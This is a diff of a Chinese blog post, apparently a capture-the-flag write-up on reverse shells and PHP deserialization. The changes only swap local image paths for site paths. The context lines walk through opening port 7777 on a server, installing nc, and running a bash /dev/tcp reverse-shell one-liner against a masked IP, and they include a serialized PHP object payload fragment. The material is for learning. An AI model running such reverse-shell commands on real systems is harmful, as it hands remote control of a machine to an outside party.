@@ -297,7 +297,7 @@ $$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";
 <p>网址<a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a></p>
 <p>这里反弹shell的原理之前讲过了，这里就不讲了</p>
 <p>搭建好服务器</p>
-<p>第一步先设置服务器，这里需要开放一个端口用来反弹shell，我这里用的7777端口<img src="C:\Users\GuoFen\AppData\Roaming\Typora\typora-user-images\image-20240717152116584.png" alt="image-20240717152116584"></p>
+<p>第一步先设置服务器，这里需要开放一个端口用来反弹shell，我这里用的7777端口<img src="/imgs/1.png"></p>
 <p>后续我们也会用这个端口复现下国赛的题目</p>
 <p>然后我们用自己的shell来连上我们的服务器</p>
 <p>刚连上服务器需要自己下载nc</p>
@@ -310,7 +310,7 @@ $$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";
 <figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">8.xxx</span>.xxx.xxx/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
 <p>成功连接上</p>
-<p><img src="C:\Users\GuoFen\AppData\Roaming\Typora\typora-user-images\image-20240717152449519.png" alt="image-20240717152449519"></p>
+<p><img src="/imgs/2.png"></p>
 <p>做这个实验也是花了一些时间</p>
 <p>当时没想到服务器要自己去打开端口</p>
 <p>没关系成功了就行</p>
